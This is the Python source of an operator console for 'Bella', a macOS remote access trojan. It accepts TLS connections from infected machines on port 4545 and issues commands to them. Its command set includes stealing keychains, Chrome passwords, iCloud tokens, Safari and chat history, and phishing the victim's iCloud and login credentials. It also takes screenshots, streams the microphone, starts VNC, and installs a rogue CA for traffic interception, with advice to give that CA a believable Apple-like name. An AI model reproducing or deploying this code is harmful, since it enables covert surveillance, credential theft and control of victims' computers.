#!/usr/bin/env python
# coding=utf-8

import socket, os, sys, select, time, bz2, random, platform, datetime, base64, pickle
import re, urllib, json, subprocess, errno, struct, optparse, ssl

try:
    import gnureadline
    macOS_rl = False
except ImportError:
    import rlcompleter
    import readline
    macOS_rl = True

violet = '\001\033[95m\002'
blue = '\001\033[94m\002' #94 for original light blue
lightBlue = '\001\033[34m\002'
green = '\001\033[92m\002' #32 for a little darker
darkGreen = '\001\033[32m\002'
yellow = '\001\033[93m\002'
red = '\001\033[31m\002'
endC = '\001\033[0m\002'
bold = '\001\033[1m\002'
italics = '\001\033[3m\002'
underline = '\001\033[4m\002'
ps1Green = '\001\033[1;32m\022'
offGreen = '\001\033[36m\002' #light blue lol
offBlue = '\001\033[38;5;148m\002'
purple = '\001\033[0;35m\002'
redX = "%s[x] %s" % (red, endC)
greenCheck = "%s[+] %s" % (green, endC)
bluePlus = "%s[*] %s" % (blue, endC)

commands = ['iCloud_query', 'upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish']

def subprocess_cleanup(subprocess_list):
    if len(subprocess_list) > 0:
        print '\nCleaning up subprocesses',
    for x in subprocess_list:
        os.kill(x, 9)
    return 0

def row_set():
    return int(subprocess.check_output("stty size", shell=True).split()[1])

def clear(*null):
    return os.system("clear")

def string_log(logged, client_log_path, client_name):
    if not os.path.isfile(os.path.join(client_log_path, client_name + ".txt")):
        #print "Logs deleted, starting new log file."
        try:
            os.makedirs(client_log_path) #create directory if it does not exist
            #print "Rebuilt user log path"
        except OSError as e:
            if e[0] == 17:
                pass
            pass
        open(os.path.join(client_log_path, client_name + ".txt"), 'w').close() #create file if it does not exist
    with open(os.path.join(client_log_path, client_name + ".txt"), "ab") as content:
        if len(logged) > 0:
            if logged[-1] == '\n':
                content.write(logged)#fixes double printing of new line
            else:
                content.write(logged + '\n')
        else:
            content.write(logged)

def byte_convert(byte):
    for count in ['B','K','M','G']:
        if byte < 1024.0:
            return ("%3.1f%s" % (byte, count)).replace('.0', '')
        byte /= 1024.0
    return "%3.1f%s" % (byte, 'TB')

def downloader(fileContent, file_name, client_log_path, client_name, path=''):
    if path:
        if not os.path.isdir(client_log_path + path):
            os.makedirs(os.path.join(client_log_path + path))
    with open(os.path.join(client_log_path, path, file_name), 'w') as content:
        content.write(fileContent)
    downloaded = "%s%s [%sB] successfully downloaded to [%s]" % (bluePlus, file_name, byte_convert((os.path.getsize(os.path.join(client_log_path, path, file_name)))), os.path.join("/".join(client_log_path.rsplit("/", 3)[1:3]), path))
    print downloaded
    string_log(downloaded, client_log_path, client_name)

def encode(key, clear):
    enc = []
    for i in range(len(clear)):
        key_c = key[i % len(key)]
        enc_c = chr((ord(clear[i]) + ord(key_c)) % 256)
        enc.append(enc_c)
    return base64.urlsafe_b64encode("".join(enc))

def decode(key, enc):
    dec = []
    enc = base64.urlsafe_b64decode(enc)
    for i in range(len(enc)):
        key_c = key[i % len(key)]
        dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)

def send_msg(sock, msg):
    msg = pickle.dumps(msg)
    finalMsg = struct.pack('>I', len(msg)) + msg
    sock.sendall(finalMsg)

def recv_msg(sock):
    raw_msglen = recvall(sock, 4, True)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recvall(sock, msglen, False)

def recvall(sock, n, length):
    if length:
        return sock.recv(4)
    data = ''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return pickle.loads(data) #convert the data back to normal

def tab_parser(text, exist):
    global file_list
    for File in file_list:
        if File.startswith(text):
            if not exist:
                return File
            else:
                exist -= 1

def progressbar(width, prefix, size):
    count = len(width)
    def show(_i):
        x = int(size*_i/count)
        string3 = "%s[%s%s] \r" % (prefix, "#"*x, "."*(size-x))
        sys.stdout.write(string3)
        sys.stdout.flush()
    show(0)
    for i, item in enumerate(width):
        yield item
        show(i+1)
    sys.stdout.write("\n")
    sys.stdout.flush()

def main():
    serverisRoot = False
    ctrlC = False
    active=False
    first_run = True
    logpath = 'Logs/'
    helperpath = ''
    client_log_path = ''
    client_name = ''
    clients = []
    connections = []
    subprocess_list = []
    global file_list
    file_list = commands
    computername = ''
    activate = 0
    columns = row_set()
    if not os.path.isfile("%sserver.key" % helperpath):
        print '\033[91mGENERATING CERTIFICATES TO ENCRYPT THE SOCKET.\033[0m\n\n'
        os.system('openssl req -x509 -nodes -days 365 -subj "/C=US/ST=Bella/L=Bella/O=Bella/CN=bella" -newkey rsa:2048 -keyout %sserver.key -out %sserver.crt' % (helperpath, helperpath))
    clear()
    port = 4545
    print '%s%s%s%s' % (purple, bold, 'Listening for clients over port [%s]'.center(columns, ' ') % port, endC)

    sys.stdout.write(blue + bold)
    for i in progressbar(range(48), '\t     ', columns - 28):
        time.sleep(0.05)
    sys.stdout.write(endC)
    colors = [blue, green, yellow]
    random.shuffle(colors)

    binder = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    binder.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    binder.bind(('', port))
    binder.listen(128) #max number of connections macOS can handle

    while True:
        columns = row_set()
        try:
            #c.settimeout(4)
            try:
                #wrap before we accept
                #to generate certs: openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout server.key -out server.crt
               sock, accept = ssl.wrap_socket(binder, ssl_version=ssl.PROTOCOL_TLSv1, cert_reqs=ssl.CERT_NONE, server_side=True, keyfile='%sserver.key' % helperpath, certfile='%sserver.crt' % helperpath).accept()
            except socket.timeout:
                continue
            except IOError as e:
                if e.errno == 2:
                    print 'You must generate SSL certificates to encrypt the socket.'
                    os.remove('%sserver.key' % helperpath) #openssl will create this empty, so remove junk
                    exit()

            if(accept):
                sock.settimeout(None)
                connections +=[sock]
                clients += [accept]
            clear() #see how many more we can accept, clear
            print "%s%s%s%s\n" % (purple, bold, 'Found clients!'.center(columns, ' '), endC)
            if len(clients)>0:
                dater=[]
                colorIndex = 0
                for j in range(0,len(clients)):
                    if colorIndex == len(colors):
                        colorIndex = 0
                    try:
                        send_msg(connections[j], 'get_client_info') #we do this because this section of this program doesnt understand the EOF construct / tuple serialization
                        message = recv_msg(connections[j])
                        dater.append(message)
                    except socket.error as e:
                        connections = []
                        clients = []
                        break
                    print '%s%s%s%s' % (colors[colorIndex], bold, ('[%s] %s, %s' % ((j+1), dater[j][0], clients[j][0])).center(columns, ' '), endC)
                    colorIndex += 1
                    print yellow + ("_"*(columns-30)).center(columns, ' ') + endC

        except KeyboardInterrupt:
            clear()
            if len(clients)>0:
                print "%s%s%s%s\n" % (purple, bold, 'Enter ID to initiate connection:'.center(columns, ' '), endC)
                colorIndex = 0
                for j in range(0,len(clients)):
                    if colorIndex == len(colors):
                        colorIndex = 0
                    print '%s%s%s%s' % (colors[colorIndex], bold, ('[%s] %s, %s' % ((j+1), dater[j][0], clients[j][0])).center(columns, ' '), endC)
                    colorIndex += 1
                    print yellow + ("_"*(columns-30)).center(columns, ' ') + endC
            while True:
                try:
                    activate = input()
                    try:
                        clients[activate - 1][0]
                    except IndexError:
                        print "Client [%s] does not exist. Try again." % activate
                        continue
                    break
                except SyntaxError, e:
                    print "Enter a client number."
                    continue

            clear()
            if activate==0:
                subprocess_cleanup(subprocess_list)
                print 'Exiting...'
                exit()
            activate -=1 #so array doesnt get thrown off
            ipadrr = clients[activate][0]
            active=True
            for i, x in enumerate(clients):
                if i != activate:
                    #print 'Rejecting Connection from [%s, %s]' % clients[i]
                    connections[i].close()
            print '%sAccepting%s Connection from [%s%s%s] at [%s%s%s]' % (yellow, endC, yellow, dater[i][0].split("->")[0], endC, yellow, clients[i][0], endC)
            send_msg(connections[activate], 'initializeSocket')
            first_run = True
            now = datetime.datetime.now()

        while active:
            try:
                columns = row_set()
                if ctrlC:
                    if process_running:
                        send_msg(connections[activate], 'sigint9kill') #this will kill their blocking program, reset our data
                        while 1:
                            x = recv_msg(connections[activate])
                            if x:
                                if x[0] == 'terminated':
                                    break
                            continue
                    data = "\n"
                    ctrlC = False
                else:
                    (data, isFinished) = recv_msg(connections[activate])
                    if not isFinished:
                        print data, #print it and continue
                        continue #just go back to top and keep receiving
                nextcmd = ''
                process_running = False

                if type(data) == type(None):
                    active=False
                    print "\n%s%sLost connection to server.%s" % (red, bold, endC)

                if first_run == True:
                    is_server_rooted = False
                    if data == 'payload_request_SBJ129':
                        print 'Payloads requested. Sending payloads...'
                        with open('Payloads/payloads.txt', 'rb') as content:
                            payloads = content.read()
                        nextcmd = 'payload_response_SBJ29:::%s'  % payloads
                        workingdir, client_name, computername, client_log_path = ('',) * 4

                    elif not data.splitlines()[0].startswith("bareNeccesities"):
                        basicInfo = data.splitlines()
                        if basicInfo[0] == 'ROOTED':
                            is_server_rooted = True
                            basicInfo.remove('ROOTED')
                        computername = basicInfo[0] #hostname via scutil
                        client_name = basicInfo[1] #username via whoami
                        workingdir = basicInfo[2] #cwd via pwd
                        last_login = basicInfo[3] #last login read via DB
                        uptime = basicInfo[4] #bella uptime
                        client_log_path = "%s%s/%s/" % (logpath, computername, client_name)
                        if not os.path.exists(client_log_path):
                            os.makedirs(client_log_path)
                        first_run = False
                        print 'Last Connected: %s -- %s' % (last_login, uptime)
                    else:
                        computername = data.splitlines()[1] #hostname via scutil
                        client_name = data.splitlines()[2] #username via whoami
                        workingdir = data.splitlines()[3] #cwd via pwd
                        client_log_path = "%s%s/%s/" % (logpath, computername, client_name)
                        if not os.path.exists(client_log_path):
                            os.makedirs(client_log_path)
                        first_run = False

                elif data.startswith('cwdcwd')==True:
                    sdoof = data.splitlines()
                    workingdir = sdoof[0][6:]
                    file_list = map(str.lower, sdoof[1:]) + sdoof[1:] + commands
                    string_log(workingdir + '\n', client_log_path, client_name)

                elif data.startswith('downloader')==True:
                    (fileContent, file_name) = pickle.loads(data[10:])
                    downloader(fileContent, file_name, client_log_path, client_name)

                elif data.startswith("mitmReady")==True:
                    os.system("osascript >/dev/null <<EOF\n\
                            tell application \"Terminal\"\n\
                            do script \"mitmproxy -p 8081 --cadir %s\"\n\
                            end tell\n\
                            EOF" % helperpath)
                    print 'MITM-ing. RUN mitm_kill AFTER YOU CLOSE MITMPROXY OR THE CLIENT\'S INTERNET WILL NOT WORK.'

                elif data.startswith('keychain_download')==True:
                    keychains = pickle.loads(data[17:])
                    for x in keychains:
                        (keychainName, keychainData) = pickle.loads(x) #[keychainName, keychainData]
                        downloader(keychainData, keychainName, client_log_path, client_name, 'Keychains')

                elif data.startswith('appleIDPhishHelp') == True:
                    content = pickle.loads(data[16:])
                    if len(content[0]) > 0:
                        print "%sFound the following iCloud accounts.\n%s\nWhich would you like to use to phish current GUI user [%s]?" % (bluePlus, content[0], content[1])
                        appleID = content[0].split(' Apple ID: [')[1][:-2]
                    else:
                        print "%sCouldn't find any iCloud accounts.\nEnter one manually to phish current GUI user [%s]" % (bluePlus, content[1])
                        appleID = ''
                    username = raw_input("Enter iCloud Account: ") or appleID
                    if username == '':
                        print 'No username specified, cancelling Phish'
                        nextcmd = ''
                    else:
                        print "Phishing [%s%s%s]" % (blue, username, endC)
                        nextcmd = "iCloudPhishFinal%s:%s" % (username, content[1])

                elif data.startswith('screenCapture')==True:
                    screen = data[13:]
                    if screen == "error":
                        print "%sError capturing screenshot!" % redX
                    else:
                        fancyTime = time.strftime("_%m-%d_%H_%M_%S")
                        os.system("mkdir -p %sScreenshots" % client_log_path)
                        with open("%sScreenshots/screenShot%s.png" % (client_log_path, fancyTime), "w") as shot:
                            shot.write(base64.b64decode(screen))
                        time.sleep(1)
                        os.system("open %sScreenshots/screenShot%s.png" % (client_log_path, fancyTime)) #We cannot have this here. Lets victim run code on our comp if they want.

                elif data.startswith('C5EBDE1F')==True:
                    deserialize = pickle.loads(data[8:])
                    for x in deserialize:
                        (name, data) = x #name will be the user, which we're going to want on the path
                        downloader(bz2.decompress(data), 'ChatHistory_%s.db' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Chat/%s' % name)
                    print "%sGot macOS Chat History" % greenCheck

                elif data.startswith('6E87CF0B')==True:
                    deserialize = pickle.loads(data[8:])
                    for x in deserialize:
                        (name, data) = x #name will be the user, which we're going to want on the path
                        downloader(bz2.decompress(data), 'history_%s.txt' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Safari/%s' % name)
                    print "%sGot Safari History" % greenCheck

                elif data.startswith('lserlser')==True:
                    (rawfile_list, filePrint) = pickle.loads(data[8:])
                    widths = [max(map(len, col)) for col in zip(*filePrint)]
                    for fileItem in filePrint:
                        line = "  ".join((val.ljust(width) for val, width in zip(fileItem, widths))) #does pretty print
                        print line
                        string_log(line, client_log_path, client_name)
                else:
                    if len(data) == 0:
                        sys.stdout.write('')
                    else:
                        print data,
                    string_log(data, client_log_path, client_name)

                """Anything above this comment is what the server is sending us."""
                #################################################################
                """Anything below this comment is what we are sending the server."""

                if data.startswith('Exit')==True:
                    active=False
                    subprocess_cleanup(subprocess_list)
                    print "\n%s%sGoodbye.%s" % (blue, bold, endC)
                    exit()
                else:
                    if is_server_rooted:
                        client_name_formatted = "%s%s@%s%s" % (red, client_name, computername, endC)
                    else:
                        client_name_formatted = "%s%s@%s%s" % (green, client_name, computername, endC)

                    if workingdir.startswith("/Users/" + client_name.lower()) or workingdir.startswith("/Users/" + client_name):
                        pathlen = 7 + len(client_name) #where 7 is our length of /Users/
                        workingdir = "~" + workingdir[pathlen:] #change working dir to ~[/users/name:restofpath] (in that range)

                    workingdirFormatted = blue + workingdir + endC
                    if macOS_rl:
                        readline.parse_and_bind("bind ^I rl_complete")
                        readline.set_completer(tab_parser)
                    else:
                        gnureadline.parse_and_bind("tab: complete")
                        gnureadline.set_completer(tab_parser)
                    if nextcmd == "":
                        try:
                            nextcmd = raw_input("[%s]-[%s] " % (client_name_formatted, workingdirFormatted))
                            string_log("[%s]-[%s] %s" % (client_name, workingdirFormatted, nextcmd), client_log_path, client_name)
                        except EOFError, e:
                            nextcmd = "exit"
                    else:
                        pass

                    if nextcmd == "removeserver_yes":
                        verify = raw_input("Are you sure you want to delete [%s]?\n🦑  This cannot be un-done. (Y/n): " % computername)
                        if verify.lower() == "y":
                            print "%s%sRemote server is being removed and permanently deleted.%s" % (red, bold, endC)
                            nextcmd = "removeserver_yes"
                            print "%s%sDestruct routine successfully sent. Server is destroyed.%s" % (red, bold, endC)
                        else:
                            print "Not deleting server."
                            nextcmd = ""

                    if nextcmd == "cls":
                        file_list = commands
                        nextcmd = ""

                    if nextcmd == ("mitm_start"):
                        try:
                            import mitmproxy
                        except ImportError:
                            print 'You need to install the python library "mitmproxy" to use this function.'
                            break
                        if not os.path.isfile("%smitm.crt" % helperpath):
                            print "%sNo local Certificate Authority found.\nThis is necessary to decrypt TLS/SSL traffic.\nFollow the steps below to generate the certificates.%s\n\n" % (red, endC)
                            os.system("openssl genrsa -out mitm.key 2048")
                            print "%s\n\nYou can put any information here. Common Name is what will show up in the Keychain, so you may want to make this a believable name (IE 'Apple Security').%s\n\n" % (red, endC)
                            os.system("openssl req -new -x509 -key mitm.key -out mitm.crt")
                            os.system("cat mitm.key mitm.crt > mitmproxy-ca.pem")
                            os.remove("mitm.key")
                            os.system("mv mitmproxy-ca.pem mitm.crt %s" % helperpath)
                            #mitm.crt is the cert we will install on remote client.
                            #mitmproxy-ca.pem is for mitmproxy
                            print '%sGenerated all certs. Sending over to client.%s' % (green, endC)
                        with open('%smitm.crt' % helperpath, 'r') as content:
                            cert = content.read()
                        print 'Found the following certificate:'
                        for x in subprocess.check_output("keytool -printcert -file %smitm.crt" % helperpath, shell=True).splitlines():
                            if 'Issuer: ' in x:
                                print "%s%s%s" % (lightBlue, x, endC)
                        interface = raw_input("🚀  Specify an interface to MITM [Press enter for Wi-Fi]: ").replace("[", "").replace("]", "") or "Wi-Fi"
                        nextcmd = "mitm_start:::%s:::%s" % (interface, cert)

                    if nextcmd == ("mitm_kill"):
                        for x in subprocess.check_output("keytool -printcert -file %smitm.crt" % helperpath, shell=True).splitlines():
                            if 'SHA1: ' in x:
                                certsha = ''.join(x.split(':')[1:]).replace(' ', '')
                                break
                            certsha = False
                        if not certsha:
                            print 'Could not find certificate to delete. You may see some warnings.'
                        interface = raw_input("🎯  Specify an interface to stop MITM [Press enter for Wi-Fi]: ").replace("[", "").replace("]", "") or "Wi-Fi"
                        nextcmd = "mitm_kill:::%s:::%s" % (interface, certsha)

                    if nextcmd == "clear":
                        clear()
                        nextcmd = "printf ''"

                    if nextcmd == "restart":
                        nextcmd = "osascript -e 'tell application \"System Events\" to restart'"

                    if nextcmd == "disableKM":
                        print "[1] Keyboard | [2] Mouse"
                        device = raw_input("Which device would you like to disable? ")
                        if device == "1":
                            nextcmd = "disableKMkeyboard"
                        elif device == "2":
                            nextcmd = "disableKMmouse"
                        else:
                            nextcmd = "printf 'You must specify a device [1] || [2].\n'"

                    if nextcmd == "enableKM":
                        print "[1] Keyboard | [2] Mouse"
                        device = raw_input("Which device would you like to enable? [BUGGY, MAY CAUSE KERNEL PANIC] ")
                        if device == "1":
                            nextcmd = "enableKMkeyboard"
                        elif device == "2":
                            nextcmd = "enableKMmouse"
                        else:
                            nextcmd = "printf 'You must specify a device [1] || [2].\n'"

                    if nextcmd == "shutdown":
                        nextcmd = "osascript -e 'tell application \"System Events\" to shut down'"

                    if nextcmd == "mike_stream":
                        try:
                            if not os.path.exists(client_log_path + 'Microphone'):
                                os.makedirs(client_log_path + 'Microphone')
                            subprocess.check_output("osascript >/dev/null <<EOF\n\
                            tell application \"Terminal\"\n\
                            ignoring application responses\n\
                            do script \"nc -l 2897 | tee '%s%s%s' 2>&1 | %s/Payloads/speakerpipe\"\n\
                            end ignoring\n\
                            end tell\n\
                            EOF" % (client_log_path, 'Microphone/', time.strftime("%b %d %Y %I:%M:%S %p"), os.getcwd()), shell=True) #tee the output for later storage, and also do an immediate stream
                        except subprocess.CalledProcessError as e:
                            pass #this is expected 'execution error: Can't get end'
                        except Exception as e:
                            print 'Error launching listener.\n[%s]' % e
                            nextcmd = ''

                    if nextcmd == "shutdown_server":
                        nextcmd = ""
                        if raw_input("Are you sure you want to shutdown the server?\nThis will unload all LaunchAgents: (Y/n) ").lower() == "y":
                            nextcmd = "shutdownserver_yes"

                    if nextcmd == "updateserver_yes":
                        if raw_input("Are you sure you want to update the server?: (Y/n) ").lower() == "y":
                            nextcmd = "updateserver_yes"
                        else:
                            nextcmd = ""

                    if nextcmd == "vnc":
                        vnc_port = 5500
                        nextcmd = "vnc_start:::%s" % vnc_port
                        proc = subprocess.Popen("/Applications/VNC\ Viewer.app/Contents/MacOS/vncviewer -listen %s" % vnc_port, shell=True)
                        subprocess_list.append(proc.pid)

                    if nextcmd == "volume":
                        vol_level = str(raw_input("Set volume to? (0[low]-7[high]) "))
                        nextcmd = "osascript -e \"Set Volume \"" + vol_level + ""

                    if nextcmd == "sysinfo":
                        nextcmd = 'scutil --get LocalHostName; whoami; pwd; echo "----------"; sw_vers; ioreg -l | awk \'/IOPlatformSerialNumber/ { print "SerialNumber: \t" $4;}\'; echo "----------";sysctl -n machdep.cpu.brand_string; hostinfo | grep memory; df -h / | grep dev | awk \'{ printf $3}\'; printf "/"; df -h / | grep dev | awk \'{ printf $2 }\'; echo " HDD space used"; echo "----------"; printf "Local IP: "; ipconfig getifaddr en0; ipconfig getifaddr en1; printf "Current Window: "; python -c \'from AppKit import NSWorkspace; print NSWorkspace.sharedWorkspace().frontmostApplication().localizedName()\'; echo "----------"'

                    if nextcmd.startswith("upload"): #uploads to CWD.
                        if nextcmd == "upload":
                            local_file= raw_input("🌈  Enter full path to file on local machine: ")
                        else:
                            local_file = nextcmd[7:] #take path as stdin
                        local_file = subprocess.check_output('printf %s' % local_file, shell=True) #get the un-escaped version for python recognition
                        if os.path.isfile(local_file):
                            with open(local_file, 'rb') as content:
                                sendFile = content.read()
                                file_name = content.name.split('/')[-1] #get absolute file name (not path)
                            file_name = raw_input("Uploading file as [%s]. Enter new name if desired: " % file_name) or file_name
                            nextcmd = "uploader%s" % pickle.dumps((sendFile, file_name))
                        else:
                            print "Could not find [%s]!" % local_file
                            nextcmd = ''

                    if nextcmd.startswith("download"): #uploads to CWD.
                        if nextcmd == "download":
                            remote_file = raw_input("🐸  Enter path to file on remote machine: ")
                        else:
                            remote_file = nextcmd[9:] #take path as stdin
                        nextcmd = 'download' + remote_file

                    if len(nextcmd) == 0:
                        nextcmd = "printf ''"

                    send_msg(connections[activate], nextcmd) #bring home the bacon
                    process_running = True

            except KeyboardInterrupt:
                ctrlC = True
                continue

            except socket.error as v:
                active = False
                clear()
                if v[0] == 54:
                    subprocess_cleanup(subprocess_list)
                    print "%s%sBroken pipe." % (red, bold, endC)
                    exit()

if __name__ == '__main__':
    main()
